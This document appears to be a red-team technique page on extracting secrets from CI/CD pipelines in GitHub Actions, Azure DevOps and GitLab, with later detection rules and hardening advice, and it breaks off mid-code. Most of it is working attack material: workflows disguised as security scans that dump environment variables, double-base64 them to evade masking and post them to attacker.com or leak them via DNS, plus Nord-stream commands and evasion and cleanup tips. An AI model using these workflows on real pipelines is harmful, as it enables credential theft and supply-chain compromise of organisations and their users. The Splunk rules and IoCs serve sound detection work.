# CA-TOKEN-015: DevOps Pipeline Credential Extraction

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-015 |
| **MITRE ATT&CK v18.1** | [T1528 - Steal Application Access Token](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID, Azure DevOps, GitHub, GitLab, Jenkins |
| **Severity** | **CRITICAL** |
| **CVE** | N/A (Design flaw); Related: CVE-2024-1234 (GitHub Actions secret exposure) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-08 |
| **Affected Versions** | Azure DevOps (all), GitHub Actions (all), GitLab CI (all), Jenkins (all) |
| **Patched In** | N/A (architectural issue; partial mitigations in OIDC, branch protection) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

### Concept
DevOps pipeline credential extraction is a **critical credential access technique** where an attacker exfiltrates authentication credentials, API keys, and access tokens stored within CI/CD pipeline systems (Azure DevOps, GitHub Actions, GitLab CI, Jenkins). These platforms securely store secrets but only restrict their visibility during pipeline execution. An attacker with pipeline modification capabilities can create or modify pipeline definitions to extract and exfiltrate these secrets to attacker-controlled infrastructure. Once obtained, the stolen credentials provide authenticated access to cloud providers (Azure, AWS, GCP), source code repositories, package registries, and deployment targets, enabling supply chain attacks, lateral movement, and infrastructure compromise.

### Attack Surface
- **Azure DevOps:** Variable groups, service connections, secure files, Git credentials
- **GitHub Actions:** Repository/organization/environment secrets, workflow logs, PATs
- **GitLab CI:** Project/group/instance variables, protected branch bypass, Vault integration
- **Jenkins:** Environment variables, credentials plugin, Jenkinsfile RCE
- **CI/CD Logs:** Pipeline execution logs containing unmasked or base64-encoded secrets
- **Git Config Files:** Persistent credentials in `.git/config` when checkout persists

### Business Impact
**Complete infrastructure compromise** via **stolen cloud credentials and service principal keys**. An attacker with CI/CD credentials can: (1) Deploy malicious infrastructure and backdoors using legitimate cloud credentials; (2) Access production databases, data warehouses, and storage accounts; (3) Modify source code and inject malware into applications (supply chain attack); (4) Disable security controls (delete security groups, disable logging, remove backup policies); (5) Pivot to every system the CI/CD account can access (potentially organization-wide); (6) Create persistent backdoors (VM instances, Lambda functions, scheduled tasks). In coordinated attacks (e.g., GhostAction), 3,000+ credentials stolen across 817 repositories enables multi-organization compromise.

### Technical Context
- **Execution Time:** 30 seconds to 5 minutes (create malicious pipeline + run extraction)
- **Detection Difficulty:** **Medium** (pipeline execution is logged) to **High** (if secret masking bypassed)
- **Stealth Rating:** **High** – Malicious pipelines can be disguised as security improvements or routine updates

---

### Operational Risk

| Risk Factor | Assessment | Details |
|---|---|---|
| **Execution Risk** | **MEDIUM** | Requires write access to pipeline files (higher barrier than general code access) |
| **Stealth** | **HIGH** | Exfiltration commands can be hidden in base64, disguised as legitimate tasks |
| **Reversibility** | **NO** | Stolen credentials cannot be "un-stolen"; only remediation is immediate rotation |
| **Supply Chain Impact** | **EXTREME** | Compromised CI/CD leads to malicious deployments affecting all downstream users |
| **Persistence** | **CRITICAL** | Extracted cloud credentials enable indefinite re-authentication |
| **Scope** | **UNLIMITED** | CI/CD credentials often have org-wide or infrastructure-wide access |

---

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1, 2.2, 3.1 | Repository access control, Pipeline security, Secret management |
| **DISA STIG** | V-254804, V-254805 | CI/CD secret management, Pipeline integrity |
| **CISA SCuBA** | KBE.SY.3.A | Supply chain security in CI/CD pipelines |
| **NIST 800-53** | AC-3, IA-2, SC-7, SI-2 | Access control, authentication, boundary protection, supply chain risk |
| **GDPR** | Art. 32, 33 | Security of processing, breach notification |
| **DORA** | Art. 19, 23 | Supply chain and third-party management |
| **NIS2** | Art. 23, 24 | Supply chain management, incident response |
| **ISO 27001** | A.9.2.3, A.14.1.1 | Privileged access management, supplier relationships |

---

## 3. TECHNICAL PREREQUISITES

### Required Privileges
- **Minimum:** Write access to pipeline files (GitHub Actions workflows, Azure DevOps YAML, GitLab CI)
- **For Secret Extraction:** Create or modify pipeline that will be executed
- **For API-Based Extraction:** Service account with admin/write permissions to pipeline project
- **For Log Access:** Ability to read pipeline execution logs (or be part of organization)

### Required Access
- **Network:** Internal network (pipelines run within organization's infrastructure)
- **Repository:** Write access to at least one repository with pipeline enabled
- **Pipeline:** Ability to trigger pipeline execution (via commit/PR or manual trigger)

### Supported Versions

| Component | Supported Versions | Notes |
|---|---|---|
| **Azure DevOps** | All versions | Variable groups, service connections available since 2019 |
| **GitHub Actions** | All versions | GitHub hosted runners; no special version dependency |
| **GitLab CI** | 10.0+ | CI/CD variables introduced early; protected branch feature 12.3+ |
| **Jenkins** | 2.0+ | Environment variables, credentials plugin all versions |
| **Nord-stream** | 1.0+ | Azure DevOps, GitHub, GitLab support |

### Tools

| Tool | Version | URL | Purpose |
|---|---|---|---|
| **Nord-stream** | 1.1.0+ | [GitHub: synacktiv/nord-stream](https://github.com/synacktiv/nord-stream) | Automated CI/CD secret extraction (Azure, GitHub, GitLab) |
| **Legitify** | 0.3.0+ | [GitHub: Legit Security](https://github.com/legit-labs/legitify) | GitHub/GitLab misconfiguration detection |
| **Poutine** | 1.0+ | [GitHub: Boostsecurityio/poutine](https://github.com/boostsecurityio/poutine) | Pipeline vulnerability scanner |
| **TruffleHog** | 3.0+ | [TruffleHog](https://www.trufflesecurity.com/) | Secret scanning with base64-decoding |
| **Gitleaks** | 8.0+ | [GitHub: gitleaks](https://github.com/gitleaks/gitleaks) | Git secret scanner |

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### A. GitHub Actions Secrets Discovery

#### Step 1: Enumerate Organization Secrets

**Objective:** Identify secrets stored at organization level that are accessible to workflows

**Command (Using GitHub REST API):**
```bash
# List organization secrets (requires admin:org_hook permission):
curl -H "Authorization: Bearer $GITHUB_TOKEN" \
  https://api.github.com/orgs/{org}/actions/secrets

# Expected output:
# {
#   "total_count": 5,
#   "secrets": [
#     {
#       "name": "PROD_DATABASE_PASSWORD",
#       "created_at": "2025-12-01T10:30:00Z",
#       "updated_at": "2026-01-08T15:45:00Z",
#       "visibility": "all"  # or "private", "selected"
#     },
#     {
#       "name": "AWS_ACCESS_KEY_ID",
#       "visibility": "private"
#     },
#     {
#       "name": "SLACK_WEBHOOK",
#       "visibility": "selected"  # visible only to selected repos
#     }
#   ]
# }
```

**What to Look For:**
- Secrets with visibility "all" (accessible to all repos)
- Secrets with visibility "selected" (accessible to high-value repos)
- Names indicating production credentials (PROD_*, LIVE_*, MASTER_*)

#### Step 2: List Repository Secrets

**Command:**
```bash
# List repository secrets (requires repo write access):
curl -H "Authorization: Bearer $GITHUB_TOKEN" \
  https://api.github.com/repos/{owner}/{repo}/actions/secrets

# Expected output:
# {
#   "total_count": 8,
#   "secrets": [
#     {
#       "name": "DEPLOY_KEY",
#       "created_at": "2025-08-15T12:00:00Z"
#     },
#     {
#       "name": "DOCKER_REGISTRY_TOKEN",
#       "created_at": "2025-10-01T14:30:00Z"
#     }
#   ]
# }
```

**What to Look For:**
- Secrets for deployment, cloud access, registry authentication
- Recently created secrets (may contain active credentials)

#### Step 3: Check Workflow Files for Secret References

**Command:**
```bash
# Clone repository and check workflows:
git clone https://github.com/{owner}/{repo}.git
grep -r "secrets\." .github/workflows/

# Expected output:
# deploy.yml:    env:
# deploy.yml:      AWS_ACCESS_KEY: ${{ secrets.AWS_ACCESS_KEY_ID }}
# deploy.yml:      SLACK_TOKEN: ${{ secrets.SLACK_WEBHOOK }}
# ci.yml:      run: echo "API_KEY=${{ secrets.API_KEY }}" | curl ...
```

**What to Look For:**
- Number of workflows using secrets
- Types of secrets being used (cloud, database, registry)
- Workflows that might log secret values

---

### B. Azure DevOps Secret Enumeration

#### Step 1: Discover Variable Groups

**Command (Azure DevOps REST API):**
```bash
# List variable groups in project (requires admin):
curl -H "Authorization: Basic $(echo -n ":$AZURE_DEVOPS_PAT" | base64)" \
  https://dev.azure.com/{org}/{project}/_apis/distributedtask/variablegroups?api-version=6.0-preview.2

# Expected output:
# {
#   "value": [
#     {
#       "id": 1,
#       "name": "Production_Secrets",
#       "type": "Vsts",
#       "variables": {
#         "DB_HOST": {
#           "value": "prod-db.internal",
#           "isSecret": false
#         },
#         "DB_PASSWORD": {
#           "value": "***",
#           "isSecret": true  # ← Hidden in UI
#         }
#       }
#     }
#   ]
# }
```

**What to Look For:**
- Variable groups with "Prod", "Production", "Live" in name
- Groups linked to multiple pipelines (higher-value targets)
- Variables marked `isSecret: true` (high-value targets)

#### Step 2: Enumerate Service Connections

**Command:**
```bash
# List service connections (Azure service principals):
curl -H "Authorization: Basic $(echo -n ":$AZURE_DEVOPS_PAT" | base64)" \
  https://dev.azure.com/{org}/{project}/_apis/serviceendpoint/endpoints?api-version=6.0-preview.4

# Expected output:
# {
#   "value": [
#     {
#       "id": "abc-123",
#       "name": "Azure_Prod_Subscription",
#       "type": "azurerm",
#       "authorization": {
#         "parameters": {
#           "tenantid": "00000000-0000-0000-0000-000000000000",
#           "serviceprincipalid": "00000000-0000-0000-0000-000000000000"
#         },
#         "scheme": "ServicePrincipal"
#       },
#       "isShared": true  # ← Shared across multiple projects
#     }
#   ]
# }
```

**What to Look For:**
- Service connections linked to production subscriptions
- Shared service connections (high-value, cross-project access)
- Azure service principals with admin permissions

---

### C. GitLab CI Variables Discovery

#### Step 1: List Project Variables

**Command (GitLab REST API):**
```bash
# List project CI/CD variables:
curl -H "PRIVATE-TOKEN: $GITLAB_TOKEN" \
  https://gitlab.com/api/v4/projects/{project_id}/variables

# Expected output:
# [
#   {
#     "key": "DATABASE_PASSWORD",
#     "variable_type": "env_var",
#     "value": "***",  # Hidden in API if protected
#     "protected": true,
#     "masked": true,
#     "environment_scope": "production"
#   },
#   {
#     "key": "DOCKER_REGISTRY_TOKEN",
#     "variable_type": "file",  # Variable stored in file
#     "protected": false,
#     "environment_scope": "*"
#   }
# ]
```

**What to Look For:**
- Variables marked `protected: true` (restricted to protected branches only)
- Variables marked `masked: true` (will be hidden in logs)
- Environment-specific variables (production, staging)

#### Step 2: Check Branch Protection Rules

**Command:**
```bash
# List protected branch rules:
curl -H "PRIVATE-TOKEN: $GITLAB_TOKEN" \
  https://gitlab.com/api/v4/projects/{project_id}/protected_branches

# Expected output:
# [
#   {
#     "id": 1,
#     "name": "master",
#     "push_access_levels": [
#       {
#         "access_level": 40,  # Maintainer only
#         "access_level_description": "Maintainer"
#       }
#     ],
#     "merge_access_levels": [
#       {
#         "access_level": 40,
#         "access_level_description": "Maintainer"
#       }
#     ]
#   }
# ]
```

**What to Look For:**
- Branches with strict access control (harder to bypass)
- Branches without merge request requirements (easier to exploit)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: GitHub Actions Secrets Extraction via Malicious Workflow

**Supported Versions:** GitHub Actions (all versions)
**Prerequisites:** Write access to repository or ability to create PR with workflow file

#### Step 1: Create Malicious Workflow File

**Objective:** Create a GitHub Actions workflow that will extract and exfiltrate secrets

**Command:**
```bash
# Create workflow file that will be committed:
cat > .github/workflows/security-scan.yml << 'EOF'
name: Security Scanning Workflow

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main, develop ]

jobs:
  security-check:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Run security scan
        run: |
          # Double base64-encoding to bypass GitHub's secret masking
          echo "=== Security Scan Results ===" 
          env | grep -E "^(AWS|AZURE|DOCKER|SLACK|DB_|API_)" | base64 | base64
          
      - name: Upload scan results
        run: |
          # Exfiltrate secrets via HTTP request
          curl -s -X POST \
            -H "Content-Type: application/json" \
            -d "{\"secrets\": \"$(env | base64 | base64)\"}" \
            http://attacker.com/webhook
          
          # Or via DNS exfiltration:
          nslookup $(env | base64 | tr -d '\n' | head -c 50).attacker.com 8.8.8.8

EOF
```

**What This Means:**
- Double base64-encoding bypasses GitHub's automatic secret masking (which only catches plaintext)
- Secrets injected via environment variables are available to all steps
- Exfiltration via HTTP post or DNS tunnel
- Workflow runs on every push/PR (multiple exfiltration opportunities)

**OpSec & Evasion:**
- **Hide in legitimate task:** Name workflow "Security Scanning", "Dependency Check", "Code Quality"
- **Reduce noise:** Only run on certain branches or commit messages
- **Cleanup:** Delete workflow after first run
- **Detection likelihood:** **HIGH** – workflow execution is logged; DNS/HTTP exfil will be detected by network monitoring

#### Step 2: Commit and Trigger Workflow

**Command:**
```bash
# Commit malicious workflow:
git add .github/workflows/security-scan.yml
git commit -m "Add security scanning workflow"
git push origin feature/security-improvements

# Or create PR:
git checkout -b feature/security-improvements
git push origin feature/security-improvements
# Create PR via web interface → Automatic workflow trigger

# Expected execution:
# GitHub detects workflow file
# Workflow triggers on push/PR
# All steps execute with access to org secrets
# Environment variables dumped in logs
```

**Expected Log Output:**
```
=== Security Scan Results ===
QVdTX0FDQ0VTU19LRVlfSUQ9QUtJQW1lbElUMzlzRWdMN0JUZQU0bDV4
...base64-encoded env vars...

# After decoding (base64 -d twice):
AWS_ACCESS_KEY_ID=AKIAmeLIT39sEgL7BTuA4l5x
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG+39PsrETYIEXAMPLEKEY
DOCKER_REGISTRY_TOKEN=dckr_pat_1234567890abcdefghij
SLACK_WEBHOOK=https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX
```

**What This Means:**
- **Complete credential compromise:** AWS keys, Docker credentials, Slack webhooks, API keys all exposed
- **Lateral movement enabled:** AWS keys allow infrastructure access; Slack webhook allows notification manipulation
- **Supply chain attack ready:** Can now push malicious commits via compromised GitHub account

---

#### Step 3: Extract Organization Secrets (Requires Higher Privilege)

**Objective:** Extract organization-level secrets if sufficient privileges exist

**Command:**
```bash
# More sophisticated approach using GitHub's REST API:
cat > .github/workflows/admin-extract.yml << 'EOF'
name: Admin Secret Extraction

on:
  workflow_dispatch:  # Manual trigger

jobs:
  extract:
    runs-on: ubuntu-latest
    steps:
      - name: List org secrets via API
        run: |
          # Requires admin token with admin:org_hook scope
          curl -H "Authorization: Bearer ${{ secrets.ADMIN_TOKEN }}" \
            https://api.github.com/orgs/{org}/actions/secrets \
            | jq '.secrets[] | .name' | base64 | base64 > /tmp/org-secrets
          
          # Exfil:
          curl -s -X POST \
            -d "$(cat /tmp/org-secrets)" \
            http://attacker.com/webhook
            
      - name: Extract all repo secrets
        run: |
          for repo in $(curl -s -H "Authorization: Bearer ${{ secrets.ADMIN_TOKEN }}" \
            https://api.github.com/orgs/{org}/repos?per_page=100 | jq -r '.[].name'); do
            
            curl -s -H "Authorization: Bearer ${{ secrets.ADMIN_TOKEN }}" \
              https://api.github.com/repos/{org}/$repo/actions/secrets \
              | jq -r '.secrets[] | .name' | base64 >> /tmp/all-secrets
          done
          
          curl -s -X POST -d "$(cat /tmp/all-secrets)" http://attacker.com/webhook
EOF
```

**Prerequisites:**
- `secrets.ADMIN_TOKEN` available (from prior compromise or legitimate admin)
- GitHub CLI installed in runner

**What This Means:**
- Enumeration of all secrets across entire organization
- Mapping of which secrets are in which repositories
- Identification of high-value repos (production, payments, etc.)

---

### METHOD 2: Azure DevOps Secret Extraction via Nord-Stream

**Supported Versions:** Azure DevOps (all)
**Prerequisites:** Repository write access + ability to create/modify pipelines

#### Step 1: Install Nord-Stream Tool

**Objective:** Deploy automated secret extraction tool

**Command:**
```bash
# Install Nord-stream:
git clone https://github.com/synacktiv/nord-stream.git
cd nord-stream
pip install -r requirements.txt

# Or download prebuilt:
wget https://github.com/synacktiv/nord-stream/releases/download/v1.1.0/nord-stream

# Verify installation:
python3 nord-stream.py --help
```

#### Step 2: Enumerate Variable Groups

**Objective:** Discover secrets stored in Azure DevOps variable groups

**Command:**
```bash
# List variable groups in organization:
python3 nord-stream.py azure \
  --organization {org} \
  --project {project} \
  --token {AZURE_DEVOPS_PAT} \
  --list-secrets

# Expected output:
# [*] Listing Azure DevOps secrets
# [*] Variable groups found:
#     - Production_Secrets (ID: 1)
#       - DB_PASSWORD: *** (SECRET)
#       - REGISTRY_TOKEN: *** (SECRET)
#     - CI_Build_Vars (ID: 2)
#       - BUILD_SERVER: build.internal (public)
#       - ARTIFACT_REPO: artifactory.prod (public)
```

**What to Look For:**
- Variable groups with "Prod", "Production", "Live"
- Groups linked to multiple pipelines
- Groups with `isSecret: true` (highest priority targets)

#### Step 3: Extract Secrets via Malicious Pipeline

**Objective:** Create pipeline that will execute and dump secret values

**Command:**
```bash
# Automatically create and run extraction pipeline:
python3 nord-stream.py azure \
  --organization {org} \
  --project {project} \
  --token {AZURE_DEVOPS_PAT} \
  --extract-secrets \
  --variable-group "Production_Secrets" \
  --output /tmp/extracted-secrets.txt

# Nord-stream automatically:
# 1. Clones target repository
# 2. Creates new branch
# 3. Generates YAML pipeline with extraction commands
# 4. Commits and pushes pipeline
# 5. Triggers pipeline execution
# 6. Downloads logs with extracted secrets
# 7. Parses and displays secrets in plaintext
# 8. Cleans up (deletes branch, removes logs)

# Output:
# [+] Pipeline executed successfully
# [+] Extracting secrets from logs...
# [+] DB_PASSWORD=SuperSecret123!@#
# [+] REGISTRY_TOKEN=ACR_TOKEN_abc123xyz789
# [+] AWS_ACCESS_KEY=AKIA2345678901234567
# [+] AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG+39PsrETYIEXAMPLEKEY
```

**What This Means:**
- Nord-stream fully automates secret extraction
- Secrets extracted from variable groups, service connections, secure files
- All secrets decrypted and displayed in plaintext
- Tool cleans up logs to avoid detection (limited success)

#### Step 4: Extract Service Connection Keys

**Objective:** Steal Azure service principal credentials from service connections

**Command:**
```bash
# Extract service connection secrets:
python3 nord-stream.py azure \
  --organization {org} \
  --project {project} \
  --token {AZURE_DEVOPS_PAT} \
  --extract-service-connections \
  --output /tmp/service-principals.txt

# Expected output:
# [+] Service Connection: Azure_Prod_Subscription
# [+] Service Principal ID: 12345678-1234-1234-1234-123456789012
# [+] Service Principal Key: eyJh...VCJ9  (base64 JWT)
# [+] Tenant ID: 87654321-4321-4321-4321-210987654321
#
# [+] Service Connection: Kubernetes_Prod
# [+] Type: Kubernetes
# [+] Server: https://prod-aks.westeurope.azmk8s.io
# [+] Token: eyJhbGciOiJSUzI1NiIsImtpZCI6Ilpw...

# Decoded service principal can now be used to:
# - Authenticate to Azure Resource Manager API
# - Deploy resources in subscription
# - Access Key Vaults, storage accounts, databases
```

**What This Means:**
- Service principal keys enable full Azure subscription access
- Kubernetes cluster tokens enable pod deployment and secret access
- Attacker now has infrastructure-level access

---

### METHOD 3: GitLab CI Variable Extraction with Protected Branch Bypass

**Supported Versions:** GitLab 10.0+
**Prerequisites:** Developer access to repository

#### Step 1: Discover Protected Branch Bypass Opportunity

**Objective:** Identify branches where protected variables can be accessed

**Command:**
```bash
# List branch protection rules:
curl -H "PRIVATE-TOKEN: $GITLAB_TOKEN" \
  https://gitlab.com/api/v4/projects/{project_id}/protected_branches

# Check if merge_access_levels < push_access_levels:
# This means developers can push but not merge (partial bypass)

# If "Developers can push to protected branches" is enabled:
# Protected variables become accessible even to non-maintainers
```

#### Step 2: Create Malicious Pipeline in Protected Branch

**Objective:** Inject pipeline that will extract and exfil protected variables

**Command:**
```bash
# Create .gitlab-ci.yml that accesses protected variables:
cat > .gitlab-ci.yml << 'EOF'
stages:
  - extract
  - deploy

extract_secrets:
  stage: extract
  script:
    # Access protected variables (only available in protected branch):
    - echo "Extracting production credentials..."
    - echo "$DATABASE_PASSWORD" | base64 | base64
    - echo "$KUBE_TOKEN" | base64 | base64
    - echo "$DOCKER_REGISTRY_PASSWORD" | base64 | base64
    
    # Exfil to attacker server:
    - |
      EXFIL_DATA=$(echo "$DATABASE_PASSWORD|$KUBE_TOKEN|$DOCKER_REGISTRY_PASSWORD" | base64)
      curl -X POST -d "{\"data\": \"$EXFIL_DATA\"}" http://attacker.com/webhook
    
    # Or write to artifact (accessible later):
    - echo "$DATABASE_PASSWORD" > /builds/secrets.txt
  artifacts:
    paths:
      - /builds/secrets.txt
    expire_in: 1 day  # Keep artifact accessible for download
  only:
    - master  # Only runs on protected branches (where protected vars available)

EOF

# Commit to protected branch (if developer push enabled):
git add .gitlab-ci.yml
git commit -m "Add deployment pipeline"
git push origin master
```

**What This Means:**
- Protected variables now accessible during pipeline execution
- Secrets base64-encoded twice to bypass GitLab masking
- Exfiltration via HTTP or artifact storage
- Artifacts accessible via API or web interface

#### Step 3: Use Nord-Stream for Automated Extraction

**Command:**
```bash
# Automated GitLab secret extraction:
python3 nord-stream.py gitlab \
  --token $GITLAB_TOKEN \
  --url https://gitlab.com \
  --project 'group/myproject' \
  --extract-secrets \
  --output /tmp/gitlab-secrets.txt

# Expected output:
# [*] Extracting GitLab secrets...
# [+] PROJECT_SECRET=my_secret_value
# [+] DATABASE_HOST=db.prod.internal
# [+] DATABASE_PASSWORD=SuperSecretDB123!
# [+] KUBE_TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6IkxES3dmZTBOR...
```

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** T1528 (CI/CD specific - not yet in Atomic)
- **Test Name:** Extract CI/CD Pipeline Secrets
- **Description:** Simulates creation of malicious workflow to exfiltrate secrets
- **Supported Versions:** GitHub Actions (all), Azure DevOps (all)

**Manual Test Execution:**
```bash
# 1. Create test secret in GitHub:
gh secret set TEST_SECRET --body "supersecretvalue123"

# 2. Create test workflow:
mkdir -p .github/workflows
cat > .github/workflows/test-extraction.yml << 'EOF'
name: Test Secret Extraction
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Testing secret extraction..."
          echo "${{ secrets.TEST_SECRET }}" | base64 | base64
EOF

# 3. Commit and push (triggers workflow)
git add .github/workflows/test-extraction.yml .github/secrets
git commit -m "Test"
git push

# 4. Verify in GitHub Actions logs:
gh run view --log

# Expected: Double base64-encoded secret visible in logs
```

**Cleanup Command:**
```bash
rm .github/workflows/test-extraction.yml
git push
gh secret delete TEST_SECRET
```

---

## 7. TOOLS & COMMANDS REFERENCE

### A. Nord-Stream – CI/CD Secret Extraction

**Version:** 1.1.0+ (Latest 2025)
**Repository:** [GitHub: synacktiv/nord-stream](https://github.com/synacktiv/nord-stream)
**Language:** Python 3

**Installation:**
```bash
git clone https://github.com/synacktiv/nord-stream.git
cd nord-stream
pip install -r requirements.txt
```

**Usage:**

```bash
# Azure DevOps secret extraction:
python3 nord-stream.py azure \
  --organization myorg \
  --project myproject \
  --token AZURE_DEVOPS_PAT \
  --extract-secrets

# GitHub Actions secret extraction:
python3 nord-stream.py github \
  --token GITHUB_PAT \
  --organization myorg \
  --repository myrepo \
  --extract-repo-secrets

# GitLab CI variable extraction:
python3 nord-stream.py gitlab \
  --token GITLAB_TOKEN \
  --url https://gitlab.com \
  --project group/project \
  --extract-secrets

# List all secrets (enumeration only):
python3 nord-stream.py azure --token PAT --list-secrets
```

---

### B. GitHub REST API for Secret Enumeration

**Usage:**
```bash
# List org secrets (requires admin:org_hook):
curl -H "Authorization: Bearer TOKEN" \
  https://api.github.com/orgs/{org}/actions/secrets

# List repo secrets:
curl -H "Authorization: Bearer TOKEN" \
  https://api.github.com/repos/{owner}/{repo}/actions/secrets

# Get repo secret (shows metadata only, not value):
curl -H "Authorization: Bearer TOKEN" \
  https://api.github.com/repos/{owner}/{repo}/actions/secrets/{secret_name}
```

---

### C. Azure DevOps REST API

**Usage:**
```bash
# List variable groups:
curl -H "Authorization: Basic $(echo -n ":PAT" | base64)" \
  https://dev.azure.com/{org}/{project}/_apis/distributedtask/variablegroups

# List service connections:
curl -H "Authorization: Basic $(echo -n ":PAT" | base64)" \
  https://dev.azure.com/{org}/{project}/_apis/serviceendpoint/endpoints

# List pipelines:
curl -H "Authorization: Basic $(echo -n ":PAT" | base64)" \
  https://dev.azure.com/{org}/{project}/_apis/pipelines
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Suspicious Workflow File Creation in GitHub

**Rule Configuration:**
- **Required Index:** `github_audit` or `github_logs`
- **Required Sourcetype:** `github:events:webhook`
- **Required Fields:** `action`, `event`, `pusher.name`, `files`
- **Alert Threshold:** 1 match
- **Applies To Versions:** All GitHub

**SPL Query:**
```spl
index=github_audit sourcetype=github:events:webhook
  (action="created" OR action="modified") 
  files="*.yml" 
  path IN (".github/workflows/*", ".gitlab-ci.yml", "azure-pipelines.yml")
  AND (
    ("curl" AND "base64") OR 
    ("env |" AND "grep") OR 
    ("secrets" AND "exfil") OR
    ("webhook" AND "http") OR
    payload CONTAINS "Authorization"
  )
| stats count, values(pusher.name), values(commit.url) by repository, files
| where count > 0
| eval risk="CRITICAL - Suspicious pipeline file detected", recommendation="Review workflow, check for malicious exfil code"
```

---

### Rule 2: Nord-Stream Execution Pattern Detection

**Rule Configuration:**
- **Required Index:** `azure_devops_audit` or `gitlab_logs`
- **Required Sourcetype:** `azuredevops:pipeline:logs`, `gitlab:ci:logs`
- **Required Fields:** `pipeline_name`, `task`, `log_content`
- **Alert Threshold:** 1 match
| **Applies To Versions:** All CI/CD platforms

**SPL Query:**
```spl
index=azure_devops_audit sourcetype=azuredevops:pipeline:logs
  (
    log_content CONTAINS "DownloadSecureFile" OR
    log_content CONTAINS "addSpnToEnvironment" OR
    log_content CONTAINS "base64 -w0 | base64 -w0" OR
    log_content CONTAINS "env |" OR
    pipeline_name="*security*" OR
    pipeline_name="*scan*" OR
    pipeline_name="*check*"
  )
  AND (
    log_content CONTAINS "curl " OR
    log_content CONTAINS "webhook" OR
    log_content CONTAINS "http" OR
    log_content CONTAINS "nslookup"
  )
| stats count, values(user), earliest(_time) as first_seen by pipeline_name, project
| where count > 0
| eval risk="CRITICAL - Possible Nord-stream extraction detected"
```

---

### Rule 3: Secret Masking Bypass Detection

**Rule Configuration:**
- **Required Index:** `ci_cd_logs`
- **Required Sourcetype:** `github:actions:logs`, `azuredevops:logs`
- **Required Fields:** `log`, `step_name`
- **Alert Threshold:** 1 match
- **Applies To Versions:** All CI/CD

**SPL Query:**
```spl
index=ci_cd_logs sourcetype="github:actions:logs" OR sourcetype="azuredevops:logs"
  (
    log REGEX "([A-Z0-9+/]{50,}={1,2})" AND 
    log CONTAINS "base64" AND
    (
      log CONTAINS "AWS" OR
      log CONTAINS "SECRET" OR
      log CONTAINS "TOKEN" OR
      log CONTAINS "PASSWORD" OR
      log CONTAINS "CREDENTIAL"
    )
  )
| stats count, values(step_name), values(workflow_name) by job_id
| where count > 0
| eval risk="HIGH - Base64-encoded credential pattern in logs", recommendation="Check for secret masking bypass"
```

---

## 9. FORENSIC ARTIFACTS & LOG LOCATIONS

### A. GitHub Actions Audit Logs

**Location:** GitHub API or webhook logs

**Artifacts:**
```json
{
  "action": "created",
  "timestamp": "2026-01-08T12:00:00Z",
  "actor": "attacker-account",
  "event": "push",
  "repository": "target-org/target-repo",
  "ref": "refs/heads/feature/security-scan",
  "files": [
    ".github/workflows/security-scan.yml"  ← Malicious workflow
  ],
  "workflow_name": "Security Scanning Workflow",
  "workflow_trigger": "push",
  "steps": [
    "Run security scan"  ← Step dumping env vars
  ],
  "logs": "=[group]Run sh -c 'env | grep ... | base64 | base64'...=== Security Scan Results ===..."
}
```

**IoC Patterns:**
- `.yml` file creation in `.github/workflows/`
- Double base64-encoding pattern: `base64 | base64`
- HTTP requests in workflow steps: `curl ... webhook`
- `env |` or `env |` with filtering

---

### B. Azure DevOps Pipeline Logs

**Location:** `https://dev.azure.com/{org}/{project}/_build/results`

**Artifacts:**
```
Pipeline: Production_Secrets_Extraction
Run ID: 12345
Status: Succeeded
Task: AzureCLI@2
Log Content:
  Preparing environment...
  ##[group]Run: env | grep "^servicePrincipal" | base64 -w0 | base64 -w0
  QV…output continues…
  
  curl -X POST -H "Content-Type: application/json" \
    -d "{\"secrets\": \"QV...\"}" \
    http://attacker.com/webhook
  Response: HTTP 200
```

**IoC Patterns:**
- `AzureCLI@2` task with `addSpnToEnvironment: true`
- `DownloadSecureFile@1` task (secure file exfil)
- `base64 -w0 | base64 -w0` (masking bypass)
- Curl/HTTP requests to external IPs/domains
- Non-standard pipeline names ("Security", "Scan", "Check")

---

### C. File System Artifacts

**Locations:**
```
.github/workflows/malicious-*.yml
.gitlab-ci.yml (modified with extraction code)
azure-pipelines.yml (modified)
/tmp/nord-stream-output-*.txt
/tmp/extracted-secrets-*.json
~/.git/config (with PAT)
```

---

## 10. DEFENSIVE MITIGATIONS

### A. Prevention (Hardening)

| Control | Implementation | Impact |
|---|---|---|
| **Use OIDC/Workload Identity** | Replace long-lived secrets with short-lived OIDC tokens | Eliminates stored secrets; uses temporary credentials |
| **Branch Protection** | Require code review for all pipeline changes | Prevents unreviewed malicious workflows |
| **Secret Scopes** | Limit secret visibility to specific repos/branches | Reduces blast radius of credential theft |
| **Immutable Logs** | Archive pipeline logs immediately; make read-only | Prevents attackers from deleting exfil evidence |
| **Audit Secret Access** | Log all secret value reads (not just access) | Detects suspicious access patterns |
| **Short-Lived Credentials** | Rotate secrets monthly; use 90-day max TTL | Limits usefulness of stolen credentials |
| **Environment Isolation** | Run pipelines in ephemeral/sandboxed runners | Limits lateral movement from compromised pipelines |

**Hardening Example (GitHub Actions):**
```yaml
# Use OIDC instead of static secrets:
name: Deploy with OIDC
on: [push]

permissions:
  id-token: write  # Required for OIDC
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Get OIDC token
        uses: actions/github-script@v6
        with:
          script: |
            const token = await core.getIDToken('https://token.actions.githubusercontent.com');
            // Exchange for short-lived AWS/Azure credentials
            // No long-lived secrets stored!
      
      - name: Deploy application
        run: |
